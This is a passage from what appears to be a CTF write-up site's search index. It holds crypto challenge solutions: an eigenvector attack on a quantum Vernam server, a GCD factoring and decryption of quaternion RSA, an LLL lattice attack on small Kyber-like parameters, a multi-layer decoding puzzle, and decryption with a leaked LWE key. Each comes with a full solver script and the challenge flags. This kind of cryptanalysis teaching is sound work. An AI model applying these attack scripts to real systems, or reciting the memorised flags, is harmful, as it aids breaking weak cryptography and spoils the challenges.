eigenbasis.</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/quantum-vernam/#step-3-construct-gate-2","title":"Step 3: Construct Gate 2","text":"<p>Gate2 runs after the encryption. At this point, our qubit is still an eigenvector (or a phase-shifted eigenvector). We need to translate it back to a standard bit so the server can measure it correctly.</p> <ul> <li>We need to turn \\(v_0\\) back into 0.</li> <li>We need to turn \\(v_1\\) back into 1.</li> </ul> <p>This is simply the reverse operation of Gate1. Mathematically, this is the Inverse of Gate1. Since we are dealing with unitary matrices, the inverse is just the conjugate transpose matrix.</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/quantum-vernam/#summary-of-the-attack","title":"Summary of the Attack","text":"<ol> <li>We send Gate1 = Eigenvectors of X.</li> <li>The server encrypts. Because the state is an eigenvector, the random key effectively does nothing observable.</li> <li>We send Gate2 = Inverse of Gate1.</li> <li>The server measures the result, which is now identical to the input message. The flag is printed.</li> </ol>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/quantum-vernam/#solution-script","title":"Solution Script","text":"<p>I wrote a script using <code>pwntools</code> and <code>numpy</code>. The trickiest part was robustly parsing the complex matrix string provided by the server, as Python's standard split functions struggle with complex number formatting (e.g., <code>1-2j</code>). I wrote a custom parser to handle that.</p> <pre><code>from pwn import *\nimport numpy as np\nimport re\n\nHOST = 'chall.polygl0ts.ch'\nPORT = 6002\n\ndef parse_matrix(matrix_str):\n    clean_str = matrix_str.replace('[', ' ').replace(']', ' ').replace('\\n', ' ')\n    regex = r'[+-]?\\d+(?:\\.\\d+)?(?:e[+-]?\\d+)?(?:[+-]\\d+(?:\\.\\d+)?(?:e[+-]?\\d+)?j)?j?'\n    raw_matches = re.findall(regex, clean_str)\n    matches = [m for m in raw_matches if len(m) &gt; 1 or m.isdigit() or 'j' in m]\n\n    values = []\n    for m in matches:\n        try:\n            values.append(complex(m.replace(' ', '')))\n        except ValueError:\n            continue\n\n    final_values = []\n    skip_next = False\n\n    if len(values) == 4:\n        final_values = values\n    else:\n        for i in range(len(values)):\n            if skip_next:\n                skip_next = False\n                continue\n\n            curr_val = values[i]\n            if i + 1 &lt; len(values):\n                next_val = values[i+1]\n                if curr_val.imag == 0 and next_val.real == 0:\n                    final_values.append(curr_val + next_val)\n                    skip_next = True\n                    continue\n\n            final_values.append(curr_val)\n\n    if len(final_values) != 4:\n        return None\n\n    return np.array(final_values).reshape(2, 2)\n\ndef solve():\n    r = remote(HOST, PORT)\n    r.recvuntil(b\"x = \")\n    matrix_str = r.recvuntil(b\"You can apply\", drop=True).decode().strip()\n\n    X = parse_matrix(matrix_str)\n    if X is None:\n        return\n\n    eigenvalues, V = np.linalg.eig(X)\n    gate1 = V\n    gate2 = np.linalg.inv(gate1)\n\n    def send_matrix(mat):\n        flat = mat.flatten()\n        for val in flat:\n            to_send = str(val).replace('(', '').replace(')', '')\n            r.sendlineafter(b\"matrix element:\", to_send.encode())\n\n    send_matrix(gate1)\n    send_matrix(gate2)\n\n    r.recvuntil(b\"measurement: \")\n    measured_bits = r.recvline().decode().strip()\n\n    rest = r.recvall().decode()\n    if \"EPFL{\" in rest:\n        flag = re.search(r\"(EPFL\\{.*?\\})\", rest).group(1)\n        print(flag)\n    else:\n        print(rest)\n\nif __name__ == \"__main__\":\n    solve()\n</code></pre>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/reduced-dimension/","title":"Reduced Dimension","text":"<p>Challenge: Reduced Dimension Category: Crypto Flag: <code>0xL4ugh{M4t_Qu4t3rn1on_By_Zwique}</code></p>","tags":["crypto","0xL4ugh-CTF-v5"]},{"location":"write-ups/reduced-dimension/#my-initial-read-first-impressions","title":"My initial read / first impressions","text":"<p>We are provided with a Python script <code>task.py</code> and the output of a run. The challenge implements a variation of RSA encryption, but instead of operating on simple integers, it operates on 4x4 matrices.</p> <p>Looking closely at the <code>get_quaternion_matrix</code> function, the matrices represent Quaternions. A quaternion <code>Q = a_0 + a_1 i + a_2 j + a_3 k</code> is represented as a matrix in the code. The encryption process is:</p> <ol> <li>Generate two strong primes <code>p</code> and <code>q</code>, and <code>n = p * q</code>.</li> <li>Encode the flag <code>m</code> into four coefficients:<ul> <li><code>a0 = m</code></li> <li><code>a1 = m + 3p + 7q</code></li> <li><code>a2 = m + 11p + 13q</code></li> <li><code>a3 = m + 17p + 19q</code></li> </ul> </li> <li>Construct the matrix <code>A</code> from these coefficients.</li> <li>Compute <code>C = A^e mod n</code> (matrix exponentiation).</li> <li>Output the first row of the resulting matrix <code>C</code>.</li> </ol> <p>The challenge is to recover <code>m</code> (the flag) given <code>n</code>, <code>e</code>, and the ciphertext row.</p>","tags":["crypto","0xL4ugh-CTF-v5"]},{"location":"write-ups/reduced-dimension/#the-vulnerability","title":"The Vulnerability","text":"<p>Standard RSA relies on the difficulty of factoring <code>n</code>. However, in this challenge, the coefficients <code>a1</code>, <code>a2</code>, <code>a3</code> are constructed using linear combinations of <code>m</code>, <code>p</code>, and <code>q</code>. This structure leaks information about the prime factors.</p> <p>Let's look at the coefficients modulo <code>p</code>: -   <code>a1 = m + 7q mod p</code> -   <code>a2 = m + 13q mod p</code> -   <code>a3 = m + 19q mod p</code></p> <p>Notice that <code>a1</code>, <code>a2</code>, and <code>a3</code> form an arithmetic progression with a common difference of <code>6q</code>. Specifically: <code>a1 + a3 = (m + 7q) + (m + 19q) = 2m + 26q = 2(m + 13q) = 2 * a2</code></p> <p>So, <code>2 * a2 - a1 - a3 = 0 mod p</code>.</p> <p>It turns out this linear relationship between the input coefficients propagates to the ciphertext components in a way that allows us to recover <code>p</code>. By taking the components of the ciphertext row <code>c0, c1, c2, c3</code> (where <code>c1, c2, c3</code> are negated in the matrix representation), we can compute:</p> <p><code>gcd(2 * c2 - c1 - c3, n)</code></p> <p>If this relationship holds, this GCD operation will reveal the prime factor <code>p</code>.</p>","tags":["crypto","0xL4ugh-CTF-v5"]},{"location":"write-ups/reduced-dimension/#the-logic","title":"The Logic","text":"<p>Once we have factored <code>n</code> into <code>p</code> and <code>q</code>, we can decrypt the message using the Chinese Remainder Theorem (CRT). We need to solve the RSA equation <code>Q^e = C</code> modulo <code>p</code> and modulo <code>q</code>.</p>","tags":["crypto","0xL4ugh-CTF-v5"]},{"location":"write-ups/reduced-dimension/#quaternion-rsa-decryption","title":"Quaternion RSA Decryption","text":"<p>Modulo a prime <code>p</code>, the encryption effectively takes place in a specific ring. The quaternion <code>Q</code> is of the form <code>scalar + vector</code>. Because we are essentially powering a single element, all intermediate values commute. This allows us to simplify the problem significantly.</p> <p>Instead of dealing with 4x4 matrices, we can work with the eigenvalues. The eigenvalues of a quaternion matrix corresponding to <code>q = s + v</code> are <code>s \u00b1 \u221a(-|v|^2)</code>.</p> <ol> <li>Calculate the \"vector norm squared\" of the ciphertext: <code>V_sq = c1^2 + c2^2 + c3^2</code>.</li> <li>The eigenvalues of the ciphertext matrix are <code>lambda_C = c0 +/- \u221a(-V_sq)</code>.</li> <li>We are looking for the eigenvalues of the plaintext matrix <code>lambda_M</code>. The relationship is standard RSA: <code>lambda_M^e = lambda_C</code>.</li> <li>We solve for <code>lambda_M</code> by computing the <code>d</code>-th power of <code>lambda_C</code>, where <code>d</code> is the modular inverse of <code>e</code>.<ul> <li>If <code>-V_sq</code> is a quadratic residue modulo <code>p</code>, we work in <code>GF(p)</code>.</li> <li>If not, we work in the extension field <code>GF(p^2)</code>.</li> </ul> </li> <li>Once we have the plaintext eigenvalues <code>mu1, mu2</code>, the message <code>m</code> (the scalar part <code>a0</code>) is simply <code>(mu1 + mu2) / 2</code>.</li> </ol>","tags":["crypto","0xL4ugh-CTF-v5"]},{"location":"write-ups/reduced-dimension/#constructing-the-solver","title":"Constructing the Solver","text":"<p>I wrote a script to: 1.  Extract the ciphertext components. 2.  Factor <code>n</code> using the GCD vulnerability derived from the arithmetic progression of the coefficients. 3.  Implement a custom <code>decrypt_scalar</code> function that solves the RSA instance in the appropriate quadratic ring (either integers mod p or a degree-2 extension). 4.  Combine the results from <code>mod p</code> and <code>mod q</code> using CRT to recover the flag.</p>","tags":["crypto","0xL4ugh-CTF-v5"]},{"location":"write-ups/reduced-dimension/#solution-script","title":"Solution Script","text":"<pre><code>import math\nfrom Crypto.Util.number import long_to_bytes, inverse\n\ndef decrypt_scalar(c0, c1, c2, c3, p, e):\n    Vsq = (c1*c1 + c2*c2 + c3*c3) % p\n    neg_Vsq = (-Vsq) % p\n\n    leg = pow(neg_Vsq, (p - 1) // 2, p)\n\n    roots = []\n    is_split = False\n\n    if leg == 0:\n        roots = [0]\n        is_split = True\n    elif leg == 1:\n        if p % 4 == 3:\n            r = pow(neg_Vsq, (p + 1) // 4, p)\n        else:\n            s = p - 1\n            r_val = 0\n            while s % 2 == 0:\n                s //= 2\n                r_val += 1\n            z = 2\n            while pow(z, (p - 1) // 2, p) != p - 1:\n                z += 1\n            m_val = r_val\n            c_val = pow(z, s, p)\n            t_val = pow(neg_Vsq, s, p)\n            R_val = pow(neg_Vsq, (s + 1) // 2, p)\n            while t_val != 1:\n                if t_val == 0:\n                    R_val = 0\n                    break\n                tt = t_val\n                i = 0\n                for k in range(1, m_val):\n                    tt = (tt * tt) % p\n                    if tt == 1:\n                        i = k\n                        break\n                b_val = pow(c_val, 1 &lt;&lt; (m_val - i - 1), p)\n                m_val = i\n                c_val = (b_val * b_val) % p\n                t_val = (t_val * c_val) % p\n                R_val = (R_val * b_val) % p\n            r = R_val\n        roots = [r]\n        is_split = True\n    else:\n        is_split = False\n\n    m_val = 0\n    if is_split:\n        r = roots[0]\n        lam1 = (c0 + r) % p\n        lam2 = (c0 - r) % p\n        d = inverse(e, p - 1)\n        mu1 = pow(lam1, d, p)\n        mu2 = pow(lam2, d, p)\n        m_val = (mu1 + mu2) * inverse(2, p) % p\n    else:\n        D = neg_Vsq\n        order = p * p - 1\n        d = inverse(e, order)\n\n        def mul2(u, v):\n            real = (u[0]*v[0] + u[1]*v[1]*D) % p\n            imag = (u[0]*v[1] + u[1]*v[0]) % p\n            return (real, imag)\n\n        def pow2(base, exp):\n            res = (1, 0)\n            while exp &gt; 0:\n                if exp % 2 == 1:\n                    res = mul2(res, base)\n                base = mul2(base, base)\n                exp //= 2\n            return res\n\n        res = pow2((c0, 1), d)\n        m_val = res[0]\n\n    return m_val\n\n# Parameters from challenge output\nn = 24436555811992972366076806922530312273907496823566498825278523886197470905017391954938641972382127780163747562797956038193398654235644409459287830339446234525262072627164429789264587184451084484976035579016063031028571643546268940916664832350416704133070528632744931737357768415126788528052461206333395794164406084571633391115829776964808677724703621221154710591190375698378697896449037181113710774632252351521950724961537615755537875194862156989318761303971336544564950137455452434307027177388197740176937447577518701185717201408469263753367188476145954061480542913006467287367140336404472235624010067372903582272729\ne = 65537\nciphertext_row = [7645133316138320672920829866179304735182212690210047500676759675676422841305242219428671895825721777886336067123230090334404443239249744649348019800170870076772170648917374424307951430757942474104583441027037157499352780211088515553775367980514698077272400388982174956856115745318060191675644580097459087877103744768611124967141106979760409192285920050555016687019974731108717211479671838777445410222040882405240324940267527783747870861280181437508731620415299917485800707003438326195859384666421699977525718115984628571014356722832203980578905816041544254774832610446558646617081820383024594943509109272533930838708, 15115864622351599035162706206257324674672546729754571030515410021905207212154731966558659435218498028437041608389247596685777775075531974586762001822195044830215779677969600204017249097853619421972862952306880626946718048703037486579156521083427871219972900601347265611525515981798763462306348832427757653091251117371763790691703299928013908976268558111890052847761824740201601000159794443256033087429920731339521534477358144537370658535238347192547096515188805816620173560028595429243354057894242958704409904709847929320587768434722670465044376198153825572537650025403520767434960328371498100779394191999106392405505, 13745229990855433471733323096856618171809729836071048905352245517395661673128741357306382928377040374671176807926741135701004188571412113925163459038871795016583126047331363592533678987966281886904921753115792048974820789657695172533157583206166353580229326903802517936396022419823884208200013314323762420208768560108045572583904747823741147655693248507409489075089305887965790292485140729487526433929859183972759579430813209494595211145046105006826362941878536200003370316700559144884743367020754865964581608047339157411175462078984500914717760473129611002520677145892778242279106724152108492680282436100305414987989, 13075867308307993713881388617739767319783540136821062304673039023416514479073968404704931053707431722417113432221377192698845939724954608884902350188774482318948356490572584570493016148272003096623369096838093349374805909370089074902960407209272664510740999775809485842810426515913298045223326669961556520541238694804400787951685561362702557941491071370737013429166029262325140106903158536926574942320103807698268441557280143112008091660020312242173901777414105294912109492658141997518018221759802285312329937197750464541705293605084821535959702107937728040393887374381496534531147546227981215469580847563998832887560]\n\nC0 = ciphertext_row[0]\nC1 = (-ciphertext_row[1]) % n\nC2 = (-ciphertext_row[2]) % n\nC3 = (-ciphertext_row[3]) % n\n\np = math.gcd(2*C2 - C1 - C3, n)\nq = n // p\n\nm_p = decrypt_scalar(C0 % p, C1 % p, C2 % p, C3 % p, p, e)\nm_q = decrypt_scalar(C0 % q, C1 % q, C2 % q, C3 % q, q, e)\n\ninv_q_p = inverse(q, p)\ninv_p_q = inverse(p, q)\nm = (m_p * q * inv_q_p + m_q * p * inv_p_q) % n\n\nprint(f\"Flag: {long_to_bytes(m)}\")\n</code></pre>","tags":["crypto","0xL4ugh-CTF-v5"]},{"location":"write-ups/revenge-of-the-sith/","title":"Revenge of the Sith","text":"<p>Challenge: Revenge of the Sith Category: Crypto Flag: <code>EPFL{N07_0N1Y_7H3_m3n_BU7_7h3_w0M3N_4ND_CHILDR3N_7o0_T50nanWvW1}</code></p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/revenge-of-the-sith/#my-initial-read-first-impressions","title":"My initial read / first impressions","text":"<p>We are provided with <code>chall.py</code> and <code>keys.json</code>. The Python script implements a cryptographic system that looks exactly like modern post-quantum algorithms (specifically Module-LWE, the basis for Kyber). It generates keys, encrypts a secret flag, and saves the results to a file.</p> <p>However, the first thing that caught my eye was the configuration at the top of the script:</p> <pre><code># Parameters\nq = 251\nn = 16\nk = 2\n</code></pre> <p>In real-world cryptography, the number <code>n</code> (the number of coefficients in our equations) is usually 256 or larger, and <code>q</code> (the modulus) is usually in the thousands.</p> <p>Here, <code>n</code> is only 16. This is incredibly small.</p> <p>The encryption works by hiding a secret key inside a mathematical equation and adding some random \"noise\" so you can't solve it with standard algebra. Usually, the sheer size of the numbers makes it impossible to find the secret despite the noise. But with <code>n=16</code>, the \"search space\" is tiny. This suggests we can simply force the math to reveal the secret using lattice attacks.</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/revenge-of-the-sith/#the-vulnerability","title":"The Vulnerability","text":"<p>The vulnerability here is Weak Parameters.</p> <p>The encryption relies on the \"Learning With Errors\" (LWE) problem. The idea is that if I give you a matrix <code>A</code> and a result <code>t</code>, where <code>t = A * secret + noise</code>, you can't find the <code>secret</code> because the <code>noise</code> messes up the calculation.</p> <p>However, this problem is geometric. You can imagine the <code>secret</code> as a specific point in a multi-dimensional grid (a lattice). The <code>noise</code> moves the point slightly off the grid intersection. If the dimensions are high enough (like 256 dimensions), finding the original grid point is impossible.</p> <p>But since we only have 16 dimensions (technically 32 total variables), the grid is small enough that we can use a special algorithm called LLL (Lenstra\u2013Lenstra\u2013Lov\u00e1sz). LLL is designed to find the \"shortest vector\" in a lattice. Since our secret key and the noise are made of very small numbers (mostly -1, 0, and 1), the vector containing our secret key is geometrically the \"shortest\" thing in the entire grid.</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/revenge-of-the-sith/#the-logic","title":"The Logic","text":"","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/revenge-of-the-sith/#1-the-setup","title":"1. The Setup","text":"<p>We need to translate the challenge's polynomial math into a linear grid that the LLL algorithm can understand.</p> <p>The challenge uses polynomials (lists of numbers), but LLL works on matrices (grids of numbers). We can convert the polynomials into matrices by following a simple rule: when you multiply by a polynomial, it's like shifting the numbers in a list. If a number falls off the end, it wraps around to the beginning with a flipped sign.</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/revenge-of-the-sith/#2-building-the-lattice","title":"2. Building the Lattice","text":"<p>We construct a large matrix (the lattice basis) that represents the equation <code>A * secret - t = -noise</code>.</p> <p>The matrix includes:</p> <ol> <li>The public key matrix <code>A</code>.</li> <li>The modulus <code>q</code> (so the math wraps around 251 correctly).</li> <li>The public result vector <code>t</code>.</li> </ol> <p>We are essentially asking the computer: \"Find me a set of small numbers that, when multiplied by <code>A</code>, gets extremely close to <code>t</code>.\"</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/revenge-of-the-sith/#3-running-lll","title":"3. Running LLL","text":"<p>We feed this matrix into the LLL algorithm. It will return a new, \"reduced\" matrix containing the shortest vectors it could find.</p> <p>One of these short vectors will essentially look like this: <code>[secret_key, error, 1]</code>.</p> <p>Because the challenge uses such small parameters, LLL will find this almost instantly. We can just read the secret key directly out of the first row of the result.</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/revenge-of-the-sith/#4-decrypting","title":"4. Decrypting","text":"<p>Once we have the secret key, the cryptography is broken. We take the encrypted messages provided in <code>keys.json</code> and reverse the process:</p> <ol> <li>Calculate <code>shared_secret = public_ciphertext * secret_key</code>.</li> <li>Subtract this from the second part of the ciphertext.</li> <li>The result will be the message plus a tiny bit of noise. We round the numbers to the nearest valid value (0 or 1) to get the flag.</li> </ol>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/revenge-of-the-sith/#solution-script","title":"Solution Script","text":"<p>I used SageMath to solve this. Sage is perfect for CTFs like this because it handles the lattice reduction (LLL) and the polynomial math automatically.</p> <pre><code>import json\n\nwith open(\"keys.json\", \"r\") as f:\n    data = json.load(f)\n\nq = 251\nn = 16\nA_raw = data[\"A\"]\nt_raw = data[\"t\"]\nu_raw = data[\"u\"]\nv_raw = data[\"v\"]\n\ndef make_cyclic_matrix(poly_list):\n    mat = []\n    current = poly_list[:]\n    for _ in range(n):\n        mat.append(current[:])\n        last = current.pop()\n        current.insert(0, (-last) % q)\n    return matrix(ZZ, mat).transpose()\n\nM00 = make_cyclic_matrix(A_raw[0][0])\nM01 = make_cyclic_matrix(A_raw[0][1])\nM10 = make_cyclic_matrix(A_raw[1][0])\nM11 = make_cyclic_matrix(A_raw[1][1])\nA_mat = block_matrix([[M00, M01], [M10, M11]])\n\nt_vec = vector(ZZ, t_raw[0] + t_raw[1])\n\ndim = 32\nidentity = identity_matrix(ZZ, dim)\nzero_mat = matrix(ZZ, dim, dim, 0)\n\nlattice = block_matrix([\n    [identity,                A_mat.transpose(),       matrix(ZZ, dim, 1, 0)],\n    [zero_mat,                identity * q,            matrix(ZZ, dim, 1, 0)],\n    [matrix(ZZ, 1, dim, 0),   matrix(ZZ, -t_vec),      matrix(ZZ, 1, 1, 1)]\n])\n\nreduced_lattice = lattice.LLL()\n\nsecret_key = None\n\nfor row in reduced_lattice:\n    if row[-1] == 1:\n        candidate = row[:dim]\n        if all(abs(x) &lt;= 1 for x in candidate):\n            secret_key = candidate\n            break\n    elif row[-1] == -1:\n        candidate = -row[:dim]\n        if all(abs(x) &lt;= 1 for x in candidate):\n            secret_key = candidate\n            break\n\ns_poly = [list(secret_key[:16]), list(secret_key[16:])]\n\ndef poly_mul_mod(p1, p2):\n    res = [0] * (2 * n)\n    for i in range(n):\n        for j in range(n):\n            res[i+j] += p1[i] * p2[j]\n    final = [0] * n\n    for i in range(len(res)):\n        if i &lt; n:\n            final[i] = (final[i] + res[i])\n        else:\n            final[i-n] = (final[i-n] - res[i])\n    return [x % q for x in final]\n\ndecrypted_bits = []\n\nfor u, v in zip(u_raw, v_raw):\n    dot_product = [0]*n\n    for i in range(2):\n        term = poly_mul_mod(s_poly[i], u[i])\n        dot_product = [(x + y) % q for x, y in zip(dot_product, term)]\n    diff = [(x - y) % q for x, y in zip(v, dot_product)]\n    for val in diff:\n        dist_to_1 = abs(val - 125)\n        dist_to_0 = min(val, 251 - val)\n        decrypted_bits.append(1 if dist_to_1 &lt; dist_to_0 else 0)\n\nchars = []\nfor i in range(0, len(decrypted_bits), 8):\n    byte_bits = decrypted_bits[i:i+8]\n    if len(byte_bits) &lt; 8:\n        break\n    chars.append(chr(int(\"\".join(map(str, byte_bits)), 2)))\n\nprint(\"Flag:\", \"\".join(chars))\n</code></pre> <p>Running this script breaks the small lattice instantly and prints out the flag.</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/the-mission-begins/","title":"The Mission Begins","text":"<p>Challenge: The Mission Begins Category: Crypto Flag: <code>csd{W3lc0m3_8aCK_70_adv3N7_2025}</code></p>","tags":["crypto","Advent-of-CTF-2025"]},{"location":"write-ups/the-mission-begins/#my-initial-read-first-impressions","title":"My initial read / first impressions","text":"<p>We\u2019re given a single file, <code>start.txt</code>, which contains what looks like space-separated binary: <pre><code>00110101 00111001 00110011 00110011 00110100 01100101 00110110 01100010 00110110 00110101 00110011 00110001 00110110 00110011 00110111 01100001 00110110 00110010 00110100 00110111 00110100 01100100 00110111 00110111 00110110 00110010 00110101 00110100 00110100 01100101 00110110 00110110 00110100 01100110 00110100 00110111 00110100 00110110 00110100 00110100 00110101 00110011 00110011 00110001 00110011 00111000 00110011 00110011 00110100 01100100 00110100 00110110 00110011 00111001 00110110 00111000 00110101 01100001 00110100 00111000 00110101 00111001 00110111 01100001 00110101 00110100 00110110 01100001 00110110 00110100 00110110 00110110 00110100 01100100 00110110 01100001 00110100 00110001 00110111 00111001 00110100 01100101 00110101 00111000 00110011 00110000 00110011 01100100\n</code></pre> Given the format (8-bit chunks separated by spaces), the obvious first step is to interpret each chunk as a byte.  </p>","tags":["crypto","Advent-of-CTF-2025"]},{"location":"write-ups/the-mission-begins/#step-1-binary-text","title":"Step 1 \u2013 Binary \u2192 text","text":"<p>Each 8-bit value can be interpreted as an ASCII character. Doing that yields: <pre><code>59334e6b6531637a62474d7762544e664f474644533138334d4639685a48597a546a64664d6a41794e58303d\n</code></pre> This is clearly hexadecimal (only <code>0\u20139</code> and <code>a\u2013f</code> characters, typical length).  </p> <p>So the first layer is: - From Binary (space-separated bytes) \u2192 ASCII string that looks like hex.  </p>","tags":["crypto","Advent-of-CTF-2025"]},{"location":"write-ups/the-mission-begins/#step-2-hex-bytes","title":"Step 2 \u2013 Hex \u2192 bytes","text":"<p>Next, we treat that string as hex and decode it to raw bytes. In text form, that gives us: <pre><code>Y3Nke1czbGMwbTNfOGFDS183MF9hZHYzTjdfMjAyNX0=\n</code></pre></p> <p>This very much looks like Base64: - Ends with <code>=</code> - Only <code>A\u2013Z</code>, <code>a\u2013z</code>, <code>0\u20139</code>, <code>+</code>, <code>/</code>, <code>=</code> </p> <p>So the second layer is: - From Hex \u2192 Base64 string.  </p>","tags":["crypto","Advent-of-CTF-2025"]},{"location":"write-ups/the-mission-begins/#step-3-base64-flag","title":"Step 3 \u2013 Base64 \u2192 flag","text":"<p>Finally, we decode the Base64 string: <pre><code>csd{W3lc0m3_8aCK_70_adv3N7_2025}\n</code></pre> That\u2019s a properly formatted flag, so we\u2019re done.</p>","tags":["crypto","Advent-of-CTF-2025"]},{"location":"write-ups/the-mission-begins/#cyberchef-recipe","title":"CyberChef recipe","text":"<p>This chain of encodings is exactly what CyberChef solves nicely. The working recipe is: 1. <code>From_Binary('Space')</code> 2. <code>From_Hex('None')</code> 3. <code>From_Base64('A-Za-z0-9+/=',true,false)</code></p> <p>Feeding the original <code>start.txt</code> contents through that recipe produces: <pre><code>csd{W3lc0m3_8aCK_70_adv3N7_2025}\n</code></pre></p>","tags":["crypto","Advent-of-CTF-2025"]},{"location":"write-ups/the-phantom-menace/","title":"The Phantom Menace","text":"<p>Challenge: The Phantom Menace Category: Crypto Flag: <code>EPFL{y0u_w3r3_r1ght_m4a5t3r_th3_n3g0t14t410n5_w3r3_5h0rt_ot3zhe}</code></p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/the-phantom-menace/#my-initial-read-first-impressions","title":"My initial read / first impressions","text":"<p>We are provided with <code>chall.py</code> and a JSON file containing keys. At first glance, this looks like a serious \"Learning With Errors\" (LWE) challenge. The code implements a cryptosystem very similar to Kyber, which is the current standard for post-quantum cryptography.</p> <p>I checked the parameters immediately, hoping for a \"Weak Parameter\" attack (like a small <code>n</code> or modulus <code>q</code>):</p> <pre><code># Parameters\nq = 3329\nn = 512\nk = 4\n</code></pre> <p>These are essentially the parameters for Kyber-512. In lattice cryptography, \\(n=512\\) with a module rank of 4 creates a lattice dimension over 2000. This is massive. You cannot solve this using lattice reduction algorithms like LLL or BKZ; the search space is astronomically too large.</p> <p>I thought I might have to look for a flaw in the random number generator or the polynomial multiplication logic, but the math looked standard.</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/the-phantom-menace/#the-vulnerability","title":"The Vulnerability","text":"<p>The vulnerability wasn't in the math\u2014it was in the file handling.</p> <p>The challenge is named \"The Phantom Menace\". In the movie, the menace (the trade federation/Sith threat) is largely a manipulation. Here, the \"menace\" of solving a post-quantum lattice problem is also fake.</p> <p>I looked at the bottom of <code>chall.py</code> where the keys are saved:</p> <pre><code>keys = {\n    \"s\":s.tolist(),\n    \"u\":u.tolist(),\n    \"v\":v.tolist()\n}\n</code></pre> <p>The script explicitly saves <code>s</code> to the public JSON file. In LWE cryptography, <code>s</code> is the Private Key.</p> <p>The security of this entire system relies on <code>s</code> being secret. If you have <code>s</code>, you don't need to break any encryption; you just perform the standard decryption process. The \"menace\" of the complex math was a phantom; we were given the key to the front door.</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/the-phantom-menace/#the-logic","title":"The Logic","text":"<p>Since we have the private key, we just need to implement the decryption function.</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/the-phantom-menace/#1-the-decryption-equation","title":"1. The Decryption Equation","text":"<p>The ciphertext consists of two parts: a vector <code>u</code> and a vector <code>v</code>.</p> <ul> <li>u is a random value masked by the public key.</li> <li>v is the message masked by the public key.</li> </ul> <p>To get the message back, we calculate: Result = v - (s \u2022 u)</p> <p>In simple terms: The vector <code>u</code> contains a specific random shift. Because we know the private key <code>s</code>, we can calculate exactly how much <code>u</code> was shifted and subtract that shift from <code>v</code>.</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/the-phantom-menace/#2-removing-noise","title":"2. Removing Noise","text":"<p>LWE is \"noisy\" encryption. The result of the calculation above won't be the exact message; it will be the message plus some small errors.</p> <ul> <li>If the result is close to 0, the message bit is 0.</li> <li>If the result is close to half the modulus (around 1665), the message bit is 1.</li> </ul> <p>We just round the numbers to the nearest valid bit to recover the plaintext.</p>","tags":["crypto","LakeCTF-Quals-2025"]},{"location":"write-ups/the-phantom-menace/#solution-script","title":"Solution Script","text":"<p>I wrote a Python script to load the keys and perform the decryption math. I re-implemented the polynomial multiplication logic from the challenge file to ensure compatibility.</p> <pre><code>import json\nimport numpy as np\n\nq = 3329\nn = 512\n\ndef solve():\n    try:\n        with open('keys.json', 'r') as f:\n            data = json.load(f)\n    except FileNotFoundError:\n        try:\n            with open('key.json', 'r') as f:\n                data = json.load(f)\n        except FileNotFoundError:\n            return\n\n    s = np.array(data['s'])\n    u = np.array(data['u'])\n    v = np.array(data['v'])\n\n    def _poly_mul(a, b):\n        res = np.convolve(a, b)\n        for i in range(n, len(res)):\n            res[i - n] = (res[i - n] - res[i]) % q\n        return res[:n] % q\n\n    def _vec_poly_mul(v0, v1):\n        return sum((_poly_mul(a, b) for a, b in zip(v0, v1))) % q\n\n    s_dot_u = _vec_poly_mul(s, u)\n    diff = (v - s_dot_u) % q\n\n    scale = (q + 1) // 2\n    bits = []\n    for val in diff:\n        dist_0 = min(val, q - val)\n        dist_1 = min(abs(val - scale), q - abs(val - scale))\n        bits.append(0 if dist_0 &lt; dist_1 else 1)\n\n    chars = []\n    for i in range(0, len(bits), 8):\n        byte_bits = bits[i:i+8]\n        if len(byte_bits) &lt; 8:\n            break\n        byte_val = int(\"\".join(map(str, byte_bits)), 2)\n        chars.append(chr(byte_val))\n\n    flag = \"\".join(chars)\n    print(flag)\n\nif __name__ == \"__main__\":\n    solve()\n</code></pre> <p>Running the script instantly decrypts the data, proving that sometimes the best way to break a crypto challenge is to check if the author accidentally gave you the key!</p>","tags":["crypto","LakeCTF-Quals-2025"]}]}